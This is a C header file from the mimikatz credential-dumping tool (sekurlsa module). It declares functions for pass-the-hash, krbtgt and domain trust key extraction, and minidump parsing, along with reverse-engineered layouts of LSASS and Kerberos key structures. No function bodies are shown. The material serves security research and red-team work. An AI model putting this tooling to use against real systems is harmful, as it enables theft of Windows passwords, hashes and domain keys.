/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m.h"
#include "globals_sekurlsa.h"

#include "kuhl_m_sekurlsa_utils.h"
#include "crypto/kuhl_m_sekurlsa_nt5.h"
#include "crypto/kuhl_m_sekurlsa_nt6.h"
#if defined(LSASS_DECRYPT)
#include "crypto/kuhl_m_sekurlsa_nt63.h"
#endif

#include "packages/kuhl_m_sekurlsa_kerberos.h"
#include "packages/kuhl_m_sekurlsa_livessp.h"
#include "packages/kuhl_m_sekurlsa_msv1_0.h"
#include "packages/kuhl_m_sekurlsa_ssp.h"
#include "packages/kuhl_m_sekurlsa_tspkg.h"
#include "packages/kuhl_m_sekurlsa_wdigest.h"
#include "packages/kuhl_m_sekurlsa_dpapi.h"
#include "packages/kuhl_m_sekurlsa_credman.h"

#include "../kerberos/kuhl_m_kerberos_ticket.h"
#include "../kuhl_m_lsadump.h"

#define KUHL_SEKURLSA_CREDS_DISPLAY_RAW					0x00000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_LINE				0x00000001
#define KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE				0x00000002

#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL			0x08000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY				0x01000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY		0x02000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK		0x07000000

#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10			0x00100000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST			0x00200000
#define KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS			0x00400000
#define KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE				0x00800000
#define KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607	0x00010000

#define KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT			0x10000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY			0x20000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN				0x40000000
#define KUHL_SEKURLSA_CREDS_DISPLAY_SSP					0x80000000

const KUHL_M kuhl_m_sekurlsa;

NTSTATUS kuhl_m_sekurlsa_init();
NTSTATUS kuhl_m_sekurlsa_clean();

VOID kuhl_m_sekurlsa_reset();

NTSTATUS kuhl_m_sekurlsa_acquireLSA();

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);

BOOL kuhl_m_sekurlsa_validateAdjustUnicodeBuffer(PUNICODE_STRING pString, PVOID pBaseBuffer, PMEMORY_BASIC_INFORMATION pMemoryBasicInformation);
NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData);
void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data);
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags);
VOID kuhl_m_sekurlsa_trymarshal(PCUNICODE_STRING MarshaledCredential);
VOID kuhl_m_sekurlsa_genericKeyOutput(struct _KIWI_CREDENTIAL_KEY * key, LPCWSTR sid);
BOOL kuhl_m_sekurlsa_genericLsaIsoOutput(struct _LSAISO_DATA_BLOB * blob, LPBYTE *output, DWORD *cbOutput);
VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(struct _ENC_LSAISO_DATA_BLOB * blob, DWORD size);
void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport);
#if !defined(_M_ARM64)
void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix);
#endif
void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix, BOOL incoming, PCUNICODE_STRING domain);
void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info);

NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[]);
#if !defined(_M_ARM64)
NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[]);
#endif
NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_bkeys(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[]);

typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
	SIZE_T tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, *PKUHL_M_SEKURLSA_ENUM_HELPER;

typedef struct _KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA {
	const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages;
	ULONG nbPackages;
} KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA, *PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA;

typedef struct _KIWI_KRBTGT_CREDENTIAL_64 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID flags;
	PVOID unk2; //
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_64, *PKIWI_KRBTGT_CREDENTIAL_64;

typedef struct _KIWI_KRBTGT_CREDENTIALS_64 {
	DWORD unk0_ver;
	DWORD cbCred;
	PVOID unk1;
	LSA_UNICODE_STRING salt;
	PVOID unk2;
	KIWI_KRBTGT_CREDENTIAL_64 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_64, *PKIWI_KRBTGT_CREDENTIALS_64;

typedef struct _KIWI_KRBTGT_CREDENTIAL_6 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID flags;
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_6, *PKIWI_KRBTGT_CREDENTIAL_6;

typedef struct _KIWI_KRBTGT_CREDENTIALS_6 {
	DWORD unk0_ver;
	DWORD cbCred;
	PVOID unk1;
	LSA_UNICODE_STRING salt;
	PVOID unk2;
	KIWI_KRBTGT_CREDENTIAL_6 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_6, *PKIWI_KRBTGT_CREDENTIALS_6;

typedef struct _KIWI_KRBTGT_CREDENTIAL_5 {
	PVOID unk0;
	PVOID unk1_key_salt;
	PVOID type;
	PVOID size;
	PVOID key;
} KIWI_KRBTGT_CREDENTIAL_5, *PKIWI_KRBTGT_CREDENTIAL_5;

typedef struct _KIWI_KRBTGT_CREDENTIALS_5 {
	DWORD unk0_ver;
	DWORD cbCred;
	LSA_UNICODE_STRING salt;
	KIWI_KRBTGT_CREDENTIAL_5 credentials[ANYSIZE_ARRAY];
} KIWI_KRBTGT_CREDENTIALS_5, *PKIWI_KRBTGT_CREDENTIALS_5;

typedef struct _DUAL_KRBTGT {
	PVOID krbtgt_current;
	PVOID krbtgt_previous;
} DUAL_KRBTGT, *PDUAL_KRBTGT;

typedef struct _KDC_DOMAIN_KEY {
	LONG	type;
	DWORD	size;
	DWORD	offset;
} KDC_DOMAIN_KEY, *PKDC_DOMAIN_KEY;

typedef struct _KDC_DOMAIN_KEYS {
	DWORD		keysSize; //60
	DWORD		unk0;
	DWORD		nbKeys;
	KDC_DOMAIN_KEY keys[ANYSIZE_ARRAY];
} KDC_DOMAIN_KEYS, *PKDC_DOMAIN_KEYS;

typedef struct _KDC_DOMAIN_KEYS_INFO {
	PKDC_DOMAIN_KEYS	keys;
	DWORD				keysSize; //60
	LSA_UNICODE_STRING	password;
} KDC_DOMAIN_KEYS_INFO, *PKDC_DOMAIN_KEYS_INFO;

typedef struct _KDC_DOMAIN_INFO {
	LIST_ENTRY list;
	LSA_UNICODE_STRING	FullDomainName;
	LSA_UNICODE_STRING	NetBiosName;
	PVOID		current;
	DWORD		unk1;	// 4		// 0
	DWORD		unk2;	// 8		// 32
	DWORD		unk3;	// 2		// 0
	DWORD		unk4;	// 1		// 1
	PVOID		unk5;	// 8*0
	DWORD		unk6;	// 3		// 2
	// align
	PSID		DomainSid;
	KDC_DOMAIN_KEYS_INFO	IncomingAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	OutgoingAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	IncomingPreviousAuthenticationKeys;
	KDC_DOMAIN_KEYS_INFO	OutgoingPreviousAuthenticationKeys;
} KDC_DOMAIN_INFO , *PKDC_DOMAIN_INFO;

typedef struct _LSAISO_DATA_BLOB {
	DWORD structSize;
	DWORD unk0;
	DWORD typeSize;
	DWORD unk1;
	DWORD unk2;
	DWORD unk3;
	DWORD unk4;
	BYTE KdfContext[32];
	BYTE Tag[16];
	DWORD unk5; // AuthData start
	DWORD unk6;
	DWORD unk7;
	DWORD unk8;
	DWORD unk9;
	DWORD szEncrypted; // AuthData ends + type
	BYTE data[ANYSIZE_ARRAY]; // Type then Encrypted
} LSAISO_DATA_BLOB, *PLSAISO_DATA_BLOB;

typedef struct _ENC_LSAISO_DATA_BLOB {
	BYTE unkData1[16];
	BYTE unkData2[16];
	BYTE data[ANYSIZE_ARRAY];
} ENC_LSAISO_DATA_BLOB, *PENC_LSAISO_DATA_BLOB;

#include "../dpapi/kuhl_m_dpapi_oe.h"
#include "kuhl_m_sekurlsa_sk.h"